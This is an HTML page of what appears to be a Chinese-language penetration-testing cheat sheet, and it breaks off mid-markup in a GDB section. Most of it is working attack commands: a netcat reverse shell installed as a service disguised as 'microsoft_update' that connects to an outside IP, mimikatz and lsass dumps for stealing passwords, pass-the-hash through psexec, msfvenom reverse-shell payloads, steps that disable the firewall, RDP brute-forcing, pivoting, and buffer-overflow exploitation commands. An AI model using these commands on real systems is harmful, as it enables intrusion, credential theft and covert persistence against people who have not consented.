<h3 id="实用的-Windows-cmd-命令"><a href="#实用的-Windows-cmd-命令" class="headerlink" title="实用的 Windows cmd 命令"></a>实用的 Windows cmd 命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">net localgroup Users</div><div class="line">net localgroup Administrators</div><div class="line">search dir/s *.doc</div><div class="line">system(&quot;start cmd.exe /k $cmd&quot;)</div><div class="line">sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore</div><div class="line">/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779</div><div class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</div><div class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</div><div class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</div><div class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统</div><div class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统</div></pre></td></tr></table></figure>
<h3 id="PuTTY-连接隧道"><a href="#PuTTY-连接隧道" class="headerlink" title="PuTTY 连接隧道"></a>PuTTY 连接隧道</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">转发远程端口到目标地址</div><div class="line">plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP</div></pre></td></tr></table></figure>
<h3 id="Meterpreter-端口转发"><a href="#Meterpreter-端口转发" class="headerlink" title="Meterpreter 端口转发"></a>Meterpreter 端口转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># https://www.offensive-security.com/metasploit-unleashed/portfwd/</div><div class="line"># 转发远程端口到目标地址</div><div class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141</div><div class="line">kali &gt; rdesktop 127.0.0.1:3389</div></pre></td></tr></table></figure>
<h3 id="开启-RDP-服务"><a href="#开启-RDP-服务" class="headerlink" title="开启 RDP 服务"></a>开启 RDP 服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0</div><div class="line">netsh firewall set service remoteadmin enable</div><div class="line">netsh firewall set service remotedesktop enable</div></pre></td></tr></table></figure>
<h3 id="关闭-Windows-防火墙"><a href="#关闭-Windows-防火墙" class="headerlink" title="关闭 Windows 防火墙"></a>关闭 Windows 防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh firewall set opmode disable</div></pre></td></tr></table></figure>
<h3 id="Meterpreter-VNC-RDP"><a href="#Meterpreter-VNC-RDP" class="headerlink" title="Meterpreter VNC\RDP"></a>Meterpreter VNC\RDP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/</div><div class="line">run getgui -u admin -p 1234</div><div class="line">run vnc -p 5043</div></pre></td></tr></table></figure>
<h3 id="使用-Mimikatz"><a href="#使用-Mimikatz" class="headerlink" title="使用 Mimikatz"></a>使用 Mimikatz</h3><p>获取 Windows 明文用户名密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/gentilkiwi/mimikatz.git</div><div class="line">privilege::debug</div><div class="line">sekurlsa::logonPasswords full</div></pre></td></tr></table></figure></p>
<h3 id="获取哈希值"><a href="#获取哈希值" class="headerlink" title="获取哈希值"></a>获取哈希值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/byt3bl33d3r/pth-toolkit</div><div class="line">pth-winexe -U hash //IP cmd</div><div class="line"></div><div class="line">或者</div><div class="line"></div><div class="line">apt-get install freerdp-x11</div><div class="line">xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</div><div class="line"></div><div class="line">在或者</div><div class="line"></div><div class="line">meterpreter &gt; run post/windows/gather/hashdump</div><div class="line">Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</div><div class="line">msf &gt; use exploit/windows/smb/psexec</div><div class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</div><div class="line">msf exploit(psexec) &gt; exploit</div><div class="line">meterpreter &gt; shell</div></pre></td></tr></table></figure>
<h3 id="使用-Hashcat-破解密码"><a href="#使用-Hashcat-破解密码" class="headerlink" title="使用 Hashcat 破解密码"></a>使用 Hashcat 破解密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hashcat -m 400 -a 0 hash /root/rockyou.txt</div></pre></td></tr></table></figure>
<h3 id="使用-NC-抓取-Banner-信息"><a href="#使用-NC-抓取-Banner-信息" class="headerlink" title="使用 NC 抓取 Banner 信息"></a>使用 NC 抓取 Banner 信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">nc 192.168.0.10 80</div><div class="line">GET / HTTP/1.1</div><div class="line">Host: 192.168.0.10</div><div class="line">User-Agent: Mozilla/4.0</div><div class="line">Referrer: www.example.com</div><div class="line">&lt;enter&gt;</div><div class="line">&lt;enter&gt;</div></pre></td></tr></table></figure>
<h3 id="使用-NC-在-Windows-上反弹-shell"><a href="#使用-NC-在-Windows-上反弹-shell" class="headerlink" title="使用 NC 在 Windows 上反弹 shell"></a>使用 NC 在 Windows 上反弹 shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">c:&gt;nc -Lp 31337 -vv -e cmd.exe</div><div class="line">nc 192.168.0.10 31337</div><div class="line">c:&gt;nc example.com 80 -e cmd.exe</div><div class="line">nc -lp 80</div><div class="line"></div><div class="line">nc -lp 31337 -e /bin/bash</div><div class="line">nc 192.168.0.10 31337</div><div class="line">nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000</div></pre></td></tr></table></figure>
<h3 id="查找-SUID-SGID-root-文件"><a href="#查找-SUID-SGID-root-文件" class="headerlink" title="查找 SUID\SGID root 文件"></a>查找 SUID\SGID root 文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"># 查找 SUID root 文件</div><div class="line">find / -user root -perm -4000 -print</div><div class="line"></div><div class="line"># 查找 SGID root 文件:</div><div class="line">find / -group root -perm -2000 -print</div><div class="line"></div><div class="line"># 查找 SUID 和 SGID 文件:</div><div class="line">find / -perm -4000 -o -perm -2000 -print</div><div class="line"></div><div class="line"># 查找不属于任何用户的文件:</div><div class="line">find / -nouser -print</div><div class="line"></div><div class="line"># 查找不属于任何用户组的文件:</div><div class="line">find / -nogroup -print</div><div class="line"></div><div class="line"># 查找软连接及其指向:</div><div class="line">find / -type l -ls</div><div class="line">Python shell</div><div class="line"></div><div class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</div></pre></td></tr></table></figure>
<h3 id="Python-Ruby-PHP-HTTP-服务器"><a href="#Python-Ruby-PHP-HTTP-服务器" class="headerlink" title="Python\Ruby\PHP HTTP 服务器"></a>Python\Ruby\PHP HTTP 服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">python2 -m SimpleHTTPServer</div><div class="line">python3 -m http.server</div><div class="line">ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :D</div><div class="line"> ocumentRoot =&gt; Dir.pwd).start&quot;</div><div class="line">php -S 0.0.0.0:8888</div></pre></td></tr></table></figure>
<h3 id="获取进程对应的-PID"><a href="#获取进程对应的-PID" class="headerlink" title="获取进程对应的 PID"></a>获取进程对应的 PID</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fuser -nv tcp 80</div><div class="line">fuser -k -n tcp 80</div></pre></td></tr></table></figure>
<h3 id="使用-Hydra-爆破-RDP"><a href="#使用-Hydra-爆破-RDP" class="headerlink" title="使用 Hydra 爆破 RDP"></a>使用 Hydra 爆破 RDP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</div></pre></td></tr></table></figure>
<h3 id="挂载远程-Windows-共享文件夹"><a href="#挂载远程-Windows-共享文件夹" class="headerlink" title="挂载远程 Windows 共享文件夹"></a>挂载远程 Windows 共享文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</div></pre></td></tr></table></figure>
<h3 id="Kali-下编译-Exploit"><a href="#Kali-下编译-Exploit" class="headerlink" title="Kali 下编译 Exploit"></a>Kali 下编译 Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -o output32 hello.c (32 位)</div><div class="line">gcc -m64 -o output hello.c (64 位)</div></pre></td></tr></table></figure>
<h3 id="Kali-下编译-Windows-Exploit"><a href="#Kali-下编译-Windows-Exploit" class="headerlink" title="Kali 下编译 Windows Exploit"></a>Kali 下编译 Windows Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</div><div class="line">wine mingw-get-setup.exe</div><div class="line">select mingw32-base</div><div class="line">cd /root/.wine/drive_c/windows</div><div class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</div><div class="line">cd /root/.wine/drive_c/MinGW/bin</div><div class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</div><div class="line">wine ability.exe</div></pre></td></tr></table></figure>
<h3 id="NASM-命令"><a href="#NASM-命令" class="headerlink" title="NASM 命令"></a>NASM 命令</h3><p>注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nasm -f bin -o payload.bin payload.asm</div><div class="line">nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</div></pre></td></tr></table></figure></p>
<h3 id="SSH-穿透"><a href="#SSH-穿透" class="headerlink" title="SSH 穿透"></a>SSH 穿透</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ssh -D 127.0.0.1:1080 -p 22 user@IP</div><div class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</div><div class="line">proxychains commands target</div></pre></td></tr></table></figure>
<h3 id="SSH-穿透从一个网络到另一个网络"><a href="#SSH-穿透从一个网络到另一个网络" class="headerlink" title="SSH 穿透从一个网络到另一个网络"></a>SSH 穿透从一个网络到另一个网络</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ssh -D 127.0.0.1:1080 -p 22 user1@IP1</div><div class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</div><div class="line">proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2</div><div class="line">Add socks4 127.0.0.1 1081 in /etc/proxychains.conf</div><div class="line">proxychains commands target</div></pre></td></tr></table></figure>
<h3 id="使用-metasploit-进行穿透"><a href="#使用-metasploit-进行穿透" class="headerlink" title="使用 metasploit 进行穿透"></a>使用 metasploit 进行穿透</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">route add X.X.X.X 255.255.255.0 1</div><div class="line">use auxiliary/server/socks4a</div><div class="line">run</div><div class="line">proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</div><div class="line"></div><div class="line">或者</div><div class="line"></div><div class="line"># https://www.offensive-security.com/metasploit-unleashed/pivoting/</div><div class="line">meterpreter &gt; ipconfig</div><div class="line">IP Address  : 10.1.13.3</div><div class="line">meterpreter &gt; run autoroute -s 10.1.13.0/24</div><div class="line">meterpreter &gt; run autoroute -p</div><div class="line">10.1.13.0          255.255.255.0      Session 1</div><div class="line">meterpreter &gt; Ctrl+Z</div><div class="line">msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec</div><div class="line">msf exploit(psexec) &gt; set RHOST 10.1.13.2</div><div class="line">msf exploit(psexec) &gt; exploit</div><div class="line">meterpreter &gt; ipconfig</div><div class="line">IP Address  : 10.1.13.2</div></pre></td></tr></table></figure>
<h3 id="基于-CSV-文件查询-Exploit-DB"><a href="#基于-CSV-文件查询-Exploit-DB" class="headerlink" title="基于 CSV 文件查询 Exploit-DB"></a>基于 CSV 文件查询 Exploit-DB</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/offensive-security/exploit-database.git</div><div class="line">cd exploit-database</div><div class="line">./searchsploit –u</div><div class="line">./searchsploit apache 2.2</div><div class="line">./searchsploit &quot;Linux Kernel&quot;</div><div class="line"></div><div class="line">cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3</div></pre></td></tr></table></figure>
<h3 id="MSF-Payloads"><a href="#MSF-Payloads" class="headerlink" title="MSF Payloads"></a>MSF Payloads</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe</div><div class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</div></pre></td></tr></table></figure>
<h3 id="MSF-生成在-Linux-下反弹的-Meterpreter-Shell"><a href="#MSF-生成在-Linux-下反弹的-Meterpreter-Shell" class="headerlink" title="MSF 生成在 Linux 下反弹的 Meterpreter Shell"></a>MSF 生成在 Linux 下反弹的 Meterpreter Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</div></pre></td></tr></table></figure>
<h3 id="MSF-生成反弹-Shell-C-Shellcode"><a href="#MSF-生成反弹-Shell-C-Shellcode" class="headerlink" title="MSF 生成反弹 Shell (C Shellcode)"></a>MSF 生成反弹 Shell (C Shellcode)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</div></pre></td></tr></table></figure>
<h3 id="MSF-生成反弹-Python-Shell"><a href="#MSF-生成反弹-Python-Shell" class="headerlink" title="MSF 生成反弹 Python Shell"></a>MSF 生成反弹 Python Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</div></pre></td></tr></table></figure>
<h3 id="MSF-生成反弹-ASP-Shell"><a href="#MSF-生成反弹-ASP-Shell" class="headerlink" title="MSF 生成反弹 ASP Shell"></a>MSF 生成反弹 ASP Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</div></pre></td></tr></table></figure>
<h3 id="MSF-生成反弹-Bash-Shell"><a href="#MSF-生成反弹-Bash-Shell" class="headerlink" title="MSF 生成反弹 Bash Shell"></a>MSF 生成反弹 Bash Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</div></pre></td></tr></table></figure>
<h3 id="MSF-生成反弹-PHP-Shell"><a href="#MSF-生成反弹-PHP-Shell" class="headerlink" title="MSF 生成反弹 PHP Shell"></a>MSF 生成反弹 PHP Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php</div><div class="line">add &lt;?php at the beginning</div><div class="line">perl -i~ -0777pe&apos;s/^/&lt;?php \n/&apos; shell.php</div></pre></td></tr></table></figure>
<h3 id="MSF-生成反弹-Win-Shell"><a href="#MSF-生成反弹-Win-Shell" class="headerlink" title="MSF 生成反弹 Win Shell"></a>MSF 生成反弹 Win Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</div></pre></td></tr></table></figure>
<h3 id="Linux-常用安全命令"><a href="#Linux-常用安全命令" class="headerlink" title="Linux 常用安全命令"></a>Linux 常用安全命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"># 使用 uid 查找对应的程序</div><div class="line">find / -uid 0 -perm -4000</div><div class="line"></div><div class="line"># 查找哪里拥有写权限</div><div class="line">find / -perm -o=w</div><div class="line"></div><div class="line"># 查找名称中包含点和空格的文件</div><div class="line">find / -name &quot; &quot; -print</div><div class="line">find / -name &quot;..&quot; -print</div><div class="line">find / -name &quot;. &quot; -print</div><div class="line">find / -name &quot; &quot; -print</div><div class="line"></div><div class="line"># 查找不属于任何人的文件</div><div class="line">find / -nouser</div><div class="line"></div><div class="line"># 查找未链接的文件</div><div class="line">lsof +L1</div><div class="line"></div><div class="line"># 获取进程打开端口的信息</div><div class="line">lsof -i</div><div class="line"></div><div class="line"># 看看 ARP 表中是否有奇怪的东西</div><div class="line">arp -a</div><div class="line"></div><div class="line"># 查看所有账户</div><div class="line">getent passwd</div><div class="line"></div><div class="line"># 查看所有用户组</div><div class="line">getent group</div><div class="line"></div><div class="line"># 列举所有用户的 crontabs</div><div class="line">for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done</div><div class="line"></div><div class="line"># 生成随机密码</div><div class="line">cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=’|fold -w 12| head -n 4</div><div class="line"></div><div class="line"># 查找所有不可修改的文件</div><div class="line">find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’</div><div class="line"></div><div class="line"># 使文件不可修改</div><div class="line">chattr -i file</div></pre></td></tr></table></figure>
<h3 id="Windows-缓冲区溢出利用命令"><a href="#Windows-缓冲区溢出利用命令" class="headerlink" title="Windows 缓冲区溢出利用命令"></a>Windows 缓冲区溢出利用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f c</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c</div><div class="line"></div><div class="line">COMMONLY USED BAD CHARACTERS:</div><div class="line">\x00\x0a\x0d\x20                              For http request</div><div class="line">\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</div><div class="line"></div><div class="line"># 常用命令:</div><div class="line">pattern create</div><div class="line">pattern offset (EIP Address)</div><div class="line">pattern offset (ESP Address)</div><div class="line">add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )</div><div class="line"></div><div class="line">!pvefindaddr pattern_create 5000</div><div class="line">!pvefindaddr suggest</div><div class="line">!pvefindaddr modules</div><div class="line">!pvefindaddr nosafeseh</div><div class="line"></div><div class="line">!mona config -set workingfolder C:\Mona\%p</div><div class="line">!mona config -get workingfolder</div><div class="line">!mona mod</div><div class="line">!mona bytearray -b &quot;\x00\x0a&quot;</div><div class="line">!mona pc 5000</div><div class="line">!mona po EIP</div><div class="line">!mona suggest</div></pre></td></tr></table></figure>
<h3 id="SEH-–-结构化异常处理"><a href="#SEH-–-结构化异常处理" class="headerlink" title="SEH – 结构化异常处理"></a>SEH – 结构化异常处理</h3><p>注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</div><div class="line"># http://baike.baidu.com/view/243131.htm</div><div class="line">!mona suggest</div><div class="line">!mona nosafeseh</div><div class="line">nseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)</div><div class="line">iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</div></pre></td></tr></table></figure></p>
<h3 id="ROP-DEP"><a href="#ROP-DEP" class="headerlink" title="ROP (DEP)"></a>ROP (DEP)</h3><p>注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。</p>
<p>DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># https://en.wikipedia.org/wiki/Return-oriented_programming</div><div class="line"># https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</div><div class="line"># https://en.wikipedia.org/wiki/Data_Execution_Prevention</div><div class="line"># http://baike.baidu.com/item/DEP/7694630</div><div class="line">!mona modules</div><div class="line">!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;</div><div class="line">!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)</div></pre></td></tr></table></figure></p>
<h3 id="ASLR-–-地址空间格局随机化"><a href="#ASLR-–-地址空间格局随机化" class="headerlink" title="ASLR – 地址空间格局随机化"></a>ASLR – 地址空间格局随机化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># https://en.wikipedia.org/wiki/Address_space_layout_randomization</div><div class="line"># http://baike.baidu.com/view/3862310.htm</div><div class="line">!mona noaslr</div></pre></td></tr></table></figure>
<p>寻蛋(EGG Hunter)技术</p>
<p>Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自<a href="http://www.pediy.com/kssd/pediy11/120392.html" target="_blank" rel="external">看雪论坛</a>，更多详情可以查阅我在代码注释中增加的链接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</div><div class="line"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</div><div class="line"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</div><div class="line">!mona jmp -r esp</div><div class="line">!mona egg -t lxxl</div><div class="line">\xeb\xc4 (jump backward -60)</div><div class="line">buff=lxxllxxl+shell</div><div class="line">!mona egg -t &apos;w00t&apos;</div></pre></td></tr></table></figure></p>
<h3 id="GDB-Debugger-常用命令"><a href="#GDB-Debugger-常用命令" class="headerlink" title="GDB Debugger 常用命令"></a>GDB Debugger 常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div 